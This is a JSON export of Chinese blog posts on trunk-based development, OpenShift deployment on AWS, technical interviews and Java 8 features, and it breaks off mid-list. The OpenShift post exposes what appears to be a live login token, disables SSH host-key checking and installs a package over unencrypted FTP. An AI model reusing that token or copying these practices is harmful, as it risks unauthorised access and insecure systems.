[{"title":"分支模型与主干开发","date":"2017-10-29T07:47:20.000Z","path":"2017/10/29/trunk-base-development/","text":"最近我和我的所在的团队在翻译一个网站： https://trunkbaseddevelopment.com/主干开发。本文结合笔者的开发经验，谈一谈项目中用到过的分支模型与使用场景，对主干开发做一个简单的介绍。 GitflowGitflow 最早应该是出现在一篇名叫A successful Git branching model的文章中，阮一峰的Git 工作流程做了更便于理解的阐述。正如问中提到，Gitflow 偏向控制管理，比较多地使用分支，试用 GitFlow 的项目基本上工作流会是这个样子: 图片出自:关于两种CI/CD策略以及git分支模型的思考 Master 分支用于发布，Develop 分支用于存放待发布（不稳定）的版本。在迭代计划里，Epic 会被先划分为一个个 Feature，一个 Feature 表示一个完整的功能，这个feature 会被拆成一个个更小的 Story（卡），如果 Feature 小的话也可以是一个 Feature 对应一个 Story，一个 Story 从被创建出来到最终上线会经历以下过程： Dev 领卡，从 Develop 分支创建一个 Feature 分支。 在 Feature 分支进行开发并通过本地测试（单元测试和部分集成测试）。 从 Feature 分支发起一个 Pull-Request 到 Develop 分支。 相关人员进行 Code Review，并将 Feature 分支合并到 Develop 分支。 写卡 Dev 删除 Feature 分支，并将卡挪到 Test，交给 QA 测试。 QA 在 Develop 分支测试完成，把卡挪到 Ready for release。 等待 Realease Master 将该 Feature 从 Devlop 分支 Merge 到 Master。 QA 在 Master 分支进行测试。 测试通过后进行发布，并在Master 分支打上 Release Tag。 可以看出流程是颇为复杂的。不过在一个团队成员流动相对较小，大家对 Gitflow 都比较熟悉的情况下，实施过程倒是没有遇到任何问题。而且可以感觉得到，这样的分支模型下的发布非常有计划性，Dev 之间的开发冲突也比较少（得益于 Feature 划分合理）。但在时间长了以后，问题还是逐一暴露出来，主要有以下几个： 重复测试，一个功能从开发到上线至少要经历三次内容重合度很高的测试：本地，Develop 分支合并，Master 分支合并；如果有 Fix bug，Merge 回 Master 还要多测一次，每一次都可能有意外的结果，而且 Develop 分支的测试和 Master 分支的测试内容几乎是一模一样的。 Release Master 的存在，在一个目标为持续发布的敏捷团队里 Release Master 的存在是不合理的，Release Master 需要在上线前的一段时间一直盯着 Pipeline（持续交付流水线），这不但意味着一个劳动力的缺失，并且一个人要想掌握一次发布的左右更改细节和影响也是几乎不可能的，所以到后来每次上线前 Release Master 都要组织一次 Release Meeting，所有开发在一起讨论这次 Release 的 Feature，非常浪费时间。 并没有做到持续交付，在 Gitflow 得分支模型下，发布是非常有计划的，一个 Feature 必须要经过以上这么多步骤才能到达生产环境，在时间上平均一个 Feature 都要等待 两周时间才能长线，这样的等待并非是需求上的“按计划发布”，而是从技术上就造成了发布瓶颈，显然难以达到持续交付的要求的。 Github Flow相比 Gitflow，Github Flow 就要简单很多，介绍可以参考Github 官方文档，同样在这篇文章中也可以看到中文版。在项目上使用 Github Flow 基本上分支会变成这个样子： 所有 Story 直接提交到 Feature 分支，再从 Feature 分支发 Pull-Request 到主分支（Master 或 Develop），Pull-Request 是为了方便 Code Review，相比于 Gitflow，这种方式因为省去了一些分支而降低了复杂度，同时也更复合持续集成的思想，以一张故事卡为集成的最小单位，相对来说集成的周期短，反馈的速度也快，能够及早的遇到问题，从而及早的解决问题。 Github flow 的另一个好处在于，可以处理跨团队协作问题。当时的项目是一个多团队共享的基础设施代码库，大部分团队需要同样的功能，就从主库 Fork 一份代码，一旦产品团队产生定制化的需求，就可以在自己的代码库里更改，并向主库发一个 Pull-Request，如果主库的维护团队认为这是一个有通用价值的更改，则会接受合并到主库中。这种方式就既保证了分布式团队拥有代码和主库的同步，又让各团队都可以向主库贡献代码，非常适合多个独立团队工作在一个代码库的情形。 图片来源：GIT 之我见 Trunk Based Development顺着持续集成的思想，如果我们把上一种分支模型做得再极致一点，我们不要 Feature 分支，或者把 Feature 分支只留在本地；不需要使用 Pull-Request 而是直接 Push 到远程 Master 分支，我们就做到了 Trunk based Development。（关于从 GitFlow 到 TBD 的论述，TW 同事尚齐在洞见上有一篇Gitflow有害论值得一读，另外想要了解得更细致可以去到官网（中文版），里面详细列举了各种实践和反模式。）本文主要就项目上落地过程中遇到的一些问题做个简要的说明。 使用主干开发后，我们的代码库原则上就只能有一个 Master 分支了，所有新功能的提交也都提交到 Master 分支上，没有了分支的代码隔离，测试和解决冲突都变得简单，持续集成也变得稳定了许多，问题也接踵而至，主要有以下三个： 如何避免发布的时候引入未完成的 Feature 如何进行线上 Bug Fix 如何重构 图片来自:What is Trunk-Based Development? 如何避免发布引入未完成 Feature答案是： Feature Toggle。 既然代码要随时保持可发布，而我们又需要只有一份代码来支持持续集成，在代码库里加一个特性开关来随时打开和关闭新特性是最容易想到的也是最容易被质疑的解决方案。 Feature Toggle 是有成本的，不管是在加 Toggle 的时候的代码设计，还是在移除 Toggle 时的人力成本和风险，都是需要和它带来的价值进行衡量的。事实上，在我们做一个前端的大特性变更的时候，我们确实没有因为没办法 Toggle 而采用了一个独立的 Feature 分支，我们认为即使为了这个分支单独做一套 Pipeline，也比在前端的各种样式间添加移除 Toggle 来得简单。但同时，团队商议决定在每次提交前都要先将 Master 分支 Merge 到 Feature 分支，以此避免分支隔离久以后合并时的痛苦。 如何进行线上 Bug Fix在发布时打上 Release Tag，一旦发现这个版本有问题，如果这个时候Master分支上没有其他提交，可以直接在 Master 分支上 Hot Fix，如果 Master 分支已经有了提交就要做以下三件事： 从 Release Tag 创建发布分支。 在 Master 上做 Fix Bug 提交。 将 Fix Bug 提交 Cherry Pick 到 Release 分支。 在Release 分支再做一次发布。 线上 Fix 通常都比较紧急。看完这个略显繁琐 Bug Fix 流程，你可能会问为什么不在 Release 分支直接 Fix，再合并到 Master 分支？ 这样做确实比较符合直觉，但事实是，如果在 Release 分支做 Fix，很可能会忘了 Merge 回 Master，试想深夜两点你做完 Bug Fix 眼看终于上线成功，这时的第一反应就是“终于可以下班了。什么，Merge 回 Master？ 明天再来吧“ 等到第二天你早已把这个事忘得一干二净。而问题要等到下一次上线才会被暴露出来，一旦发现，而这个时候上一次 Release 的人又不在，无疑增加了很多工作量。 如何重构这里指的是比较大规模的重构，无法在一次提交完成，TBD 要求每一次提交都是一个可上线的版本，所以这同时还意味着这个重构无法再一个上线周期内完成。 这种情况，需要在代码设计中增加一个抽象层，保证在重构过程中先不动原来的代码，也不破坏既有功能，类似于蓝绿部署中的负载均衡器的作用，这样的流程就是： 在将要被重构的代码逻辑附近引入抽象层然后提交，对所有人可见。如果有需要可以是多个提交，这些提交都不能破坏 build，然后依次 push 到共享代码库。 为将要被引入的代码写抽象层的第二次实现，然后提交。但在主干上由于关闭状态所以其他开发人员暂时不依赖于它。如果需要的话，这可能像上面那样需要多次提交。第一步的抽象层也可能偶然被调整，但必须遵循同样的原则：不能破坏build。 切换使用重构后的代码，然后 Push。 删除原有的旧实现（被重构代码） 删除抽象层 这个流程和汽车换轮胎有那么点类似，新旧轮胎代表重构前后代码，抽象层就好比千斤顶。 图片来自: 主干开发：抽象分支 一点感受TBD 还因为被 Google，亚马逊这样的公司采用而闻名，可以参照阮一峰的另篇文章：谷歌的代码管理，但并不因此意味着 TBD 就适用于所有场景。即使是是 CICD 已经被广泛接受，也不能称持续交付为软件开发的银弹。技术用的对不对，还是要看上下文。 最后附上 Truk Based Development 的中文网站（还在翻译中）：https://cn.trunkbaseddevelopment.com/","tags":[{"name":"git","slug":"git","permalink":"https://www.duyidong.com/tags/git/"},{"name":"coding","slug":"coding","permalink":"https://www.duyidong.com/tags/coding/"},{"name":"持续集成","slug":"持续集成","permalink":"https://www.duyidong.com/tags/持续集成/"}]},{"title":"Openshift 多节点部署","date":"2017-09-23T14:10:00.000Z","path":"2017/09/23/openshift-cluster-in-aws/","text":"本文介绍如何在 AWS 中搭建一个 Openshift 集群。 主要用到的资源：https://github.com/openshift/openshift-ansible-contrib/tree/master/reference-architecture/aws-ansible 开始之前你最好对这这些知识点有一定了解：AWS (EC2, ELB, IAM, CloudFormation)，Ansible，Bash，同时建议先看看本博客中关于 Openshift 和 Kubernetes 的基础知识：Part 1 Part 2 Part 3 完整的 Openshift 架构： 准备 使用 Route53 申请一个域名。这里注册为 oc-tw.net ，后文中出现这个 oc-tw.net 的部分请替换为注册域名。 选择一个至少有 3 个 AZ 的 Region。这里选择为悉尼，Region id（可在console的 URL 中获得）为：ap-southeast-2。 开始创建堡垒机这个堡垒机是用于运行 Ansible 脚本及配置集群使用，并非 Openshift 集群的一部分。所以可以用手动创建的方式，可以选择在本地运行。 从 Marketplace 找一个 Centos7 的 AMI （如图所示）创建一个 EC2 instance 并绑定一个 EIP，开启 22 端口。 Instance 启动完成后，登录到堡垒机上，执行如下安装命令：（后面的全部命令行操作均在堡垒机上执行） yum -y install atomic-openshift-utils ansible openshift-ansible-playbooks rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm yum -y install python2-boto \\ pyOpenSSL \\ git \\ python-netaddr \\ python-six \\ python2-boto3 \\ python-click \\ python-httplib2 rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm yum -y install python-pip git python2-boto \\ python-netaddr python-httplib2 python-devel \\ gcc libffi-devel openssl-devel python2-boto3 \\ python-click python-six pyOpenSSL 获取 Ansible 脚本mkdir -p /usr/share/ansible/openshift-ansible # Openshift 官方配置脚本 git clone https://github.com/openshift/openshift-ansible.git /usr/share/ansible/openshift-ansible # contribution 脚本 git clone https://github.com/openshift/openshift-ansible.git cd openshift-ansible-contrib/reference-architecture/aws-ansible/ 配置 SSHvi ~/.ssh/config Host *.oc-tw.net # 这里需要替换申请来的注册域名 ProxyCommand ssh ec2-user@bastion -W %h:%p IdentityFile /root/.ssh/yidong_ohio_openshift.pem Host bastion Hostname bastion.oc-tw.net # 替换为注册域名 user ec2-user StrictHostKeyChecking no ProxyCommand none CheckHostIP no ForwardAgent yes IdentityFile /root/.ssh/yidong_sydney.pem # 保存在本地的 ssh 私钥 AWS 秘钥对写入环境变量由于堡垒机需要申请 AWS 资源并取得配置权限，所以需要配置 AWS 秘钥对，这里因为 Ansible 是从环境变量里获得 AWS 秘钥的，所以没有使用 IAM role。 export AWS_ACCESS_KEY_ID=foo export AWS_SECRET_ACCESS_KEY=bar 设置 Github OAuth这里需要使用 github OAuth 完成单点登录设置，参照官方文档。 Homepage URL 格式为：https://openshift-master.oc-tw.net （一二级域名替换为注册域名） Authorization callback URL 格式为：https://openshift-master.oc-tw.net/oauth2callback/github（一二级域名替换为注册域名） OAuth App 添加完成后将会得到一个 Client ID 和一个 Client Secret，后面会使用到。 执行在堡垒机中openshift-ansible-contrib/reference-architecture/aws-ansible/目录下创建并执行如下脚本： ./ose-on-aws.py \\ --keypair=yidong_sydney \\ # 所以 EC2 Instance 用于通信的 keypair --public-hosted-zone=oc-tw.net \\ # 注册域名 --deployment-type=origin \\ # 在 Region 部署(会创建 VPC ) --ami=ami-ccecf5af \\ # 注意* --github-client-secret=&lt;Client Secret&gt; \\ # Github Client Secret --github-organization=&lt;Organization name&gt; \\ # Github 中 OAuth Organization 的名字 --github-client-id=&lt;Client ID&gt; \\ # Github Client ID --region=ap-southeast-2 \\ # 堡垒机所在 Region，也是创建 Openshift 集群的 Region --key-path=/root/.ssh/yidong_sydney.pem \\ # 堡垒机上私钥存放位置 --containerized=true # 集群以容器的方式启动 *这里有一个需要特别注意的地方，就是 AMI 必须使用 RHEL 的 AMI，在 AWS 中 RHEL 会比 CentOS 大约贵 30%，但是使用 CentOS 会比 REHL 缺很多包，安装起来非常麻烦，所以建议直接使用 RHEL，AMI ID 可以在直接在 AWS EC2 lunch instance 的界面中找到。 还有很多可配置项，保持默认值即可。 创建集群基础设施运行脚本，大致逻辑是： 使用 Cloudformation 创建基础设施资源 -&gt; 使用 Ansible连接 EC2 instance 并配置集群 -&gt; 开启监控和日志搜集。 Cloudformation 里的基础设施大致包含：EC2, EIP, SG, ELB, IAM(User, Role, Policy, AccessKey), VPC(RouteTable, Subnet, Route, InternetGateway, RouteTable), NatGateway。 注意：这套脚本所启动的集群至少需要 9 个 EC2 instance，（如图所示）从 t2.micro 到 m4.xlarge，在Cloudformation 创建开始后，如果你的账户没有在免费试用期每小时大概会划费 2-3$，具体参见官方文档，注意选择RHEL和你所在的Region，价格会有差异。 Trouble ShootingAnsible 脚本的运行时间大概在一个小时，有 4000+ 个 Tasks（有的是重复执行），这里列举一些常见错误并给出解决思路。 Anisble 连接不上目标机形如下图，如果错误中包含连接错误或是 SSH 问题， Repo 里的 Ansible 是通过 SSH 连接配置目标机的，这种情况以下三种原因基本可以覆盖： SSH Config 没写对 Key Pair 有问题 服务器指纹有问题 排查思路：直接尝试从堡垒机 SSH 到目标机（ssh &lt;instance name&gt;这里因为配置了域名解析所以可以直接用 instance name ssh），再根据错误信息排查（可以跟上参数 -vvvv 打印详细日志），如果 SSH 能成功，Ansible 执行也就没有问题。 找不到 Docker形如： 是由于 Docker registry 没有配置正确，需要手动到机器上执行 yum-config-manager --enable rhui-REGION-rhel-server-extras，写个 for 循环自动执行： all_hosts=&quot;master01 master02 master03 app-node01 app-node02 infra-node01 infra-node02 infra-node03&quot; for h in $all_hosts; do ssh ec2-user@ose-$h.oc-tw.net &#39;sudo yum-config-manager --enable rhui-REGION-rhel-server-extras -y&#39;; done 缺少依赖形如： 解决思路比较简单，缺什么装什么，比如缺少httpd-tools: sudo yum install -y httpd-tools 不过有的包可能会麻烦点，需要在网上找一下，比如python-passlib: rpm -Uvh ftp://rpmfind.net/linux/centos/7.4.1708/extras/x86_64/Packages/python-passlib-1.6.5-2.el7.noarch.rpm 安装成功 经过一段时间的运行，脚本跑完的时候也就说明 Openshift 安装成功了，这个时候你可以通过https://openshift-master.oc-tw.net/console/ 这个连接访问它的 Console 界面，直接使用 GitHub账号登录。 同时一个外部可访问的 Registry 也被创建出来（如图） https://registry-console-default.apps.oc-tw.net/ 查看 Node，登录到其中一台 master node 上执行 oc get nodes -o wide 命令行登录使用 Token 登录，可以在 https://openshift-master.oc-tw.net/console/command-line 获取登录 Token oc login https://openshift-master.oc-tw.net --token=bcD3sprC9hjOgopov9VfbHEaBbPK03WQt23MXm-KtGw # 尝试创建新 app oc new-app centos/ruby-22-centos7~https://github.com/openshift/ruby-ex.git 更多命令添加 Node： ./add-node.py --region=us-east-2 --keypair=yidong_sydney --public-hosted-zone=oc-tw.net --deployment-type=origin --ami=ami-ccecf5af \\ --use-cloudformation-facts --subnet-id=subnet-1139825c \\ --node-type=app --shortname=ose-app-node03 --existing-stack=openshift-infra 销毁 Openshift 集群：（也可以直接删除 Cloudformation Stack） ansible-playbook -i inventory/aws/hosts \\ -e &#39;region=us-east-2 stack_name=openshift-infra ci=true&#39; \\ -e &#39;extra_app_nodes=openshift-infra-ose-app-node03&#39; \\ playbooks/teardown.yaml","tags":[{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"},{"name":"PaaS","slug":"PaaS","permalink":"https://www.duyidong.com/tags/PaaS/"},{"name":"Openshift","slug":"Openshift","permalink":"https://www.duyidong.com/tags/Openshift/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://www.duyidong.com/tags/Kubernetes/"},{"name":"平台即服务","slug":"平台即服务","permalink":"https://www.duyidong.com/tags/平台即服务/"}]},{"title":"ThoughtWorks 技术面试","date":"2017-09-19T06:12:33.000Z","path":"2017/09/19/tw-tech-interview/","text":"第一次参加公司校招面试，还是比较有感触的。在此之前我理解的校招面试大多得考运气，因为大家普遍认为校招进来的学生什么都不会，需要从零培养，所以我也一直认为 TW 的校招无非就是挑选一些看起来比较聪明的孩子，技术方面没有过多要求。今日一见，发觉相去甚远，公司凭借稍长的面试周期，从技术，性格，成长多维度的考察，可谓是360度无死角地最大限度保证了应届生质量。 这次校招主要分以下几个阶段：HR电话面试 -&gt; Homework -&gt; 技术面试 -&gt; HR 终面，笔者作为 Developer 参加了看作业和技术面试两个环节，从和资深面试官结对面试到听 HR 们对候选人的评价分析，不但学习到如何辨识优秀应届生，对自我审查也是大有裨益。 基本上应届生中有以下几种能力是比较被看重的： 扎实的基本工考察基本功第一个点就是家庭作业，Homework 实现起来其实都不难，考察点主要在代码质量，处理逻辑，和工程实践上，这些考察点均要建立在平时有足够的编码实践，有扎实的基础知识的前提下。基础稍弱的候选人在作业上表现往往表现出读题不仔细，功能实现不完整，未按题目要求作答，例如题目中明确要求要面向对象，而交上来的作业却只有一个类，这样的代码显然不能通过作业审查。扎实的基础还会表现在现场面试时针对作业的交流上，平时在学校写代码可能很少有用语言去解释代码的机会，面试的时候对实现细节的描述就很容易暴露候选人对语言特性和实现机制是否了解。 扎实的基本功并非一朝一夕可以练就，需要从平时的学习中来，还需要候选人有强烈的好奇心不断地钻研，实现功能的同时不但要知其然还要知其所以然，最好还能列出几种实现方式，并说清楚他们的优势劣势。这一点我想对所有的程序员都适用。 熟练的编程技能说起 ThoughtWorks 的现场面试，最容易让人脸红心跳的可能就是结对编程环节，这个环节除了处理好情绪上的问题之外最重要的还是平时的积累，一句话就是要多写。这一点差距是很明显的，不太写代码的候选人拿到题目就会咬指甲、紧张、沉思很久，写起代码来磕磕绊绊，IDE 频繁报错还不知道错从何来。而编程技能熟练的候选人除了能做到流畅书写代码之外甚至还能够边写边解释，这一步是在做什么，为什么这样做，对面试官提出的提问还能做出深入的解释，快速响应面试官提出的修改意见，这都离不开平时的练习。 这一点主要还是要靠平时跟着老师做项目，研究生会比较占优势。或者凭借自己的兴趣写点小工具解决自己生活中的问题，要是有参与过开源项目就更出彩了。 实事求是的简历这次面试比较多的遇到了这种情况：从简历上看，这位候选人很优秀，学霸，项目经验丰富，各种技术齐全，落坐也是自信满满，可一到提问环节，越深入问下去越是伤痕累累，一问到细节就答不上来或者想蒙混过关。这其实反应出后选人在平时编码过程中缺乏思考，没有理解透彻，尤其对习惯于“项目驱动学习”或是“老师驱动学习”的同学表现明显，好的程序员不但应有主动学习的习惯，还应掌握一定的学习方法，具体可以参考我司同事写的这篇 写给自学者的入门指南。另外对于蒙混过关这种行为着实不可取，参与面试的考官平均工作年限也有七八年，一些没吃透的知识点其实很容易就被看出来了。 这一点还是要求候选人要对自己简历上写的东西负责，“精通”，“熟悉”这类词要慎用，尤其不要想显得什么都会，还是要突出重点，再有就是选择投简历的时候看着点方向，尽可能去吻合自己熟悉和感兴趣的领域。 不要把面试太当回事，秀出你自己一些候选人在面试的时候会比较紧张，尤其到根据简历提问的环节，会显得畏首畏尾，这样的候选人除了可能面试经验不足，我推测在他们心里一定还把面试当成了一场考试，时时想着“千万不要考我不懂的地方”，“千万不要问我去年那个项目因为我没做点啥”，可是越是畏惧越是漏出破绽（根据墨菲定律，如果你担心某种情况发生，那么它就更有可能发生）。其实可以换种思路，面试是让你秀出自己，说你擅长的，聊你想聊的。在众多后续人让你脱颖而出的一定是你的自信和你的闪光点，考官并不会像试卷一样为难你（其实考试也不是，只是人往往更容易记住那些让你绞尽脑汁的体验，就跟老师同学会上总会对班上的差生印象深刻一个道理），相反考官其实很想看到你擅长的地方地方是什么，他们会小心翼翼地提问，哪个项目是你映像最深刻的，深入细节前先问问这个技术是不是你熟悉的，如果不是那我们就换一个也没关系，目的就是要看到候选人在自己擅长的领域究竟有多擅长，对自己“喜欢”的技术究竟有投入多少去学习。这一点可能是 TW 和别的公司不太一样的地方，产品公司技术面试一般会偏重公司用到的技术，因为大部分时候他们在发布招聘启事的时候已经想好怎么用这个人了，而 TW 因为项目类型繁多各式技术都有涉及，所以会更关注候选人自己的兴趣和技术方向，候选人应该充分利用这一点，引导考官来到自己擅长的领域，我们会非常乐意看到出彩的你。 面试之前问问你自己：你真的喜欢编程吗？很多考生在来之前会做很多功课，了解公司面试流程和喜好偏向，甚至为心仪的公司准备定制好的简历，这是聪明的做法。但我认为有一类人在面 TW 前可以说几乎不需要准备，那就是他真正热爱编程。如果你热爱编程，你一定会投入时间和经历去学习，如果你经常写代码，你一定会遇到很多问题并自己动手解决，在此过程中自然会积累扎实的编程技能，如果你有丰富的编程经验，必然会有一份拿得出手且不需要过度美化的简历。如果你以上都满足了，面试的时候不用太紧张，聊你想聊的，秀你想秀的，你会和面试官成为朋友并获得他的强烈推荐的。","tags":[{"name":"ThoughtWorks","slug":"ThoughtWorks","permalink":"https://www.duyidong.com/tags/ThoughtWorks/"},{"name":"面试","slug":"面试","permalink":"https://www.duyidong.com/tags/面试/"},{"name":"职场","slug":"职场","permalink":"https://www.duyidong.com/tags/职场/"}]},{"title":"Java 8 新特性","date":"2017-08-30T02:42:34.000Z","path":"2017/08/30/what-new-in-java8/","text":"Java 从 1995年正式发布第一个版本至今已走过 21 个年头，从一开始受人怀疑的慢语言发展为如今通用的健壮语言。笔者 11 年开始接触 Java1.6 到后来转投 Python，再转向云架构，而今因项目需求再次拾起 Java 已经过了两次版本更新，借项目上的机会，将 Java8 的新特性做一个梳理。 官方文档； PPT （一）Programming LanguageLambda 表达式 (Lambda Expression )Lambda允许把函数作为一个方法的参数（函数作为参数传递进方法中）。 形如: input -&gt; body 在代码中:(arg1, arg2...) -&gt; { body } (type1 arg1, type2 arg2...) -&gt; { body } 示例如下： () -&gt; 42 a -&gt; return a*a (int a, int b) -&gt; { return a + b; } () -&gt; System.out.println(&quot;Hello World&quot;); (String s) -&gt; { System.out.println(s); } 注意: lambda 表达式只能引用 final 或 final 局部变量，这就是说不能在 lambda 内部修改定义在域外的变量，否则会编译错误。 方法引用 (Method References)适用场景：当一个Lambda表达式调用了一个已存在的方法 构造器引用：它的语法是Class::new，或者更一般的Class&lt; T &gt;::new 静态方法引用：它的语法是Class::static_method 特定类的任意对象的方法引用：它的语法是Class::method 特定对象的方法引用：它的语法是instance::method 示例如下: // 使用Lambda表达式 (a, b) -&gt; {return a * b}; // 使用Lambda表达式，调用已存在的方法 (a, b) -&gt; Calculator.calculate(a, b); // 使用方法引用 Calculator::calculate; 换句话说， Instead of usingAN ANONYMOUS CLASSyou can useA LAMBDA EXPRESSIONAnd if this just calls one method, you can useA METHOD REFERENCE 一个完整的例子 (中文翻译) 注意： 当需要往引用的方法传其它参数的时候不适用，如下示例： IsReferable demo = () -&gt; ReferenceDemo.commonMethod(&quot;Argument in method.&quot;); 函数式接口（Functional Interface）任何接口，如果只包含一个抽象方法（这种类型的接口也称为SAM接口，即Single Abstract Method interfaces），那么它就是一个函数式接口。为了让编译器帮助我们确保一个接口满足函数式接口的要求，Java8 提供了@FunctionalInterface注解，Java 不会强制要求你使用@FunctionalInterface注解来标记你的接口是函数式接口， 然而，作为API作者， 你可能倾向使用@FunctionalInterface指明特定的接口为函数式接口， 这只是一个设计上的考虑， 可以让用户很明显的知道一个接口是函数式接口。 函数式接口的一个非常重要的用途就是对Lambda提供支持，看下面的例子： public class Book { public String name; public String author; public double price; } public class BookStore { private List&lt;Book&gt; books = new ArrayList&lt;&gt;(); } 现在我希望BookStore能够筛选出BookStore中符合某种条件书籍，筛选条件可能多种多样，比如，所有Martin Fowler的著作，或者价格大于某个金额的所有书籍，于是，我们新增了BookFilter接口，并且为BookStore添加了list方法： public interface BookFilter { boolean test(Book book); } public class BookStore { private List&lt;Book&gt; books = new ArrayList&lt;&gt;(); public List&lt;Book&gt; list(BookFilter filter) { List&lt;Book&gt; result = new ArrayList&lt;&gt;(); books.forEach(book -&gt; { if (filter.test(book)) { result.add(book); } }); return result; } } 现在，我们就可以在调用list方法时使用Lambda表达式了： // 筛选出所有价格大于15.0的书籍 bookStore.list(book -&gt; book.price &gt; 15.0) 因为BookFilter是一个函数式接口，只具有一个抽象方法，所以在编译期可以很容易推断Lambda表达式和BookFilter是否匹配，于是Lambda表达式的实现就简单了。 更多例子参见： Java 8 函数式接口; Java 8 预览之Functional Interface 默认方法（Default Methods）官方文档给默认方法给出的定义： Default methods enable new functionality to be added to the interfaces of libraries and ensure binary compatibility with code written for older versions of those interfaces. 默认方法允许您添加新的功能到现有库的接口中，并能确保与采用旧版本接口编写的代码的二进制兼容性。 当类实现接口的时候，类要实现接口中所有的方法，否则类必须声明为抽象的类。默认方法就是接口可以有实现方法，而且不需要实现类去实现其方法。也就是说，即使你的API已经发布出去了，你依然可以为接口添加新方法并且无需考虑向后兼容问题。 默认方法是在接口中的方法签名前加上了 default 关键字的实现方法。 举个例子: interface InterfaceA { default void foo() { System.out.println(&quot;InterfaceA foo&quot;); } } class ClassA implements InterfaceA { } public class Test { public static void main(String[] args) { new ClassA().foo(); // 打印：“InterfaceA foo” } } ClassA 类并没有实现 InterfaceA 接口中的 foo 方法，InterfaceA 接口中提供了 foo 方法的默认实现，因此可以直接调用 ClassA 类的 foo 方法。 和其它方法一样，接口默认方法也可以被继承，这样一来接口就面临了多继承问题，如下图所示，Interface C 继承了 Interface A 和 B，如果 A 和 B 中存在相同的签名方法，C 就要处理继承冲突的问题。 +---------------+ +------------+ | Interface A | |Interface B | +-----------^---+ +---^--------+ | | | | | | +-+------------+--+ | Interface C| +------------+ 接口多继承冲突分为以下三种情况： A和B的默认方法（传入参数）不同， C隐式继承了两个默认方法，不会有冲突。 但是有的情况下即使是不同签名的方法也是很难分辨的，比如传入类型为short 和 int，Java会选择最适合的方法， 请参看 Java规范 15.12.2.5 A,B拥有相同签名的默认方法如果接口C没有override这个方法， 则编译出错。这种情况需要在子接口C中覆盖override这个方法，并可以使用 InterfaceName.super.methodName(); 的方式手动调用需要的接口默认方法。（注意方法签名不包括方法的返回值， 也就是仅仅返回值不同的两个方法的签名也是相同的） 更多多继承问题，参见： Java 8 默认方法和多继承 重复注解（Repeating Annotations）自从Java 5中引入注解以来，这个特性开始变得非常流行，并在各个框架和项目中被广泛使用。不过，注解有一个很大的限制是：在同一个地方不能多次使用同一个注解。Java 8打破了这个限制，引入了重复注解的概念，允许在同一个地方多次使用同一个注解。 例如： @Repeatable(Authorities.class) public @interface Authority { String role(); } public @interface Authorities { Authority[] value(); } public class RepeatAnnotationUseNewVersion { @Authority(role=&quot;Admin&quot;) @Authority(role=&quot;Manager&quot;) public void doSomeThing(){ } } 具体参见：Java 8新特性探究（五）重复注解 类型注解（Type Annotations）在java 8之前，注解只能是在声明的地方所使用，比如类，方法，属性；java 8里面，注解可以应用在任何地方，比如： // 创建类实例 new @Interned MyObject(); // 类型映射 myString = (@NonNull String) str; // implements 语句中 class UnmodifiableList&lt;T&gt; implements @Readonly List&lt;@Readonly T&gt; { ... } // throw exception声明 void monitorTemperature() throws @Critical TemperatureException { ... } 需要注意的是，类型注解只是语法而不是语义，并不会影响java的编译时间，加载时间，以及运行时间，也就是说，编译成class文件的时候并不包含类型注解。 类型注解的作用，参见：Java 8新特性探究（四）类型注解 复杂还是便捷 （二）Stream官方文档对 Collection 的解释： Classes in the new java.util.stream package provide a Stream API to support functional-style operations on streams of elements. The Stream API is integrated into the Collections API, which enables bulk operations on collections, such as sequential or parallel map-reduce transformations. java.util.stream 提供了一系列 Stream API 以支持函数式的流式操作。 Stream API 集成在 Collections API 中，它可以对集合进行批量操作，例如串行或并行转换流。 Java 8 中的Stream 是对集合（Collection）对象功能的增强，它专注于对集合对象进行各种非常便利、高效的聚合操作（aggregate operation），或者大批量数据操作 (bulk data operation)。Stream API 借助于同样新出现的 Lambda 表达式，极大的提高编程效率和程序可读性。 参考：Java 8 中的 Streams API 详解 什么是 StreamStream 不是集合元素，它不是数据结构并不保存数据，它是有关算法和计算的，它更像一个高级版本的迭代器(Iterator)，单向，不可往复，数据只能遍历一次，遍历过一次后即用尽了，就好比流水从面前流过，一去不复返。而和迭代器又不同的是，Stream 可以并行化操作，且数据源本身可以是无限的。 Stream 的生命周期当我们使用一个流的时候，通常包括三个基本步骤： 获取一个数据源（source）→ 数据转换→执行操作获取想要的结果。 Stream 的构造和转换构造流的几种常见方法 // 1. Individual values Stream stream = Stream.of(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;); // 2. Arrays String [] strArray = new String[] {&quot;a&quot;, &quot;b&quot;, &quot;c&quot;}; stream = Stream.of(strArray); stream = Arrays.stream(strArray); // 3. Collections List&lt;String&gt; list = Arrays.asList(strArray); stream = list.stream(); 需要注意的是，对于基本数值型，目前有三种对应的包装类型 Stream：IntStream、LongStream、DoubleStream。当然我们也可以用 Stream、Stream、Stream，但是 boxing 和 unboxing 会很耗时，所以特别为这三种基本数值型提供了对应的 Stream。 Java 8 中还没有提供其它数值型 Stream，因为这将导致扩增的内容较多。而常规的数值型聚合运算可以通过上面三种 Stream 进行。 数值流的构造 IntStream.of(new int[]{1, 2, 3}).forEach(System.out::println); IntStream.range(1, 3).forEach(System.out::println); IntStream.rangeClosed(1, 3).forEach(System.out::println); 数值流的转换 流转换为其它数据结构： // 1. Array String[] strArray1 = stream.toArray(String[]::new); // 2. Collection List&lt;String&gt; list1 = stream.collect(Collectors.toList()); List&lt;String&gt; list2 = stream.collect(Collectors.toCollection(ArrayList::new)); Set set1 = stream.collect(Collectors.toSet()); Stack stack1 = stream.collect(Collectors.toCollection(Stack::new)); // 3. String String str = stream.collect(Collectors.joining()).toString(); ### Stream 的操作Stream 的转换分为以下三种操作类型： Intermediate：一个流可以后面跟随零个或多个 intermediate 操作。其目的主要是打开流，做出某种程度的数据映射/过滤，然后返回一个新的流，交给下一个操作使用。这类操作都是惰性化的（lazy），就是说，仅仅调用到这类方法，并没有真正开始流的遍历。 包括：map (mapToInt, flatMap 等)、 filter、 distinct、 sorted、 peek、 limit、 skip、 parallel、 sequential、 unordered Terminal：一个流只能有一个 terminal 操作，当这个操作执行后，流就被使用“光”了，无法再被操作。所以这必定是流的最后一个操作。Terminal 操作的执行，才会真正开始流的遍历，并且会生成一个结果，或者一个 side effect。 包括：forEach、 forEachOrdered、 toArray、 reduce、 collect、 min、 max、 count、 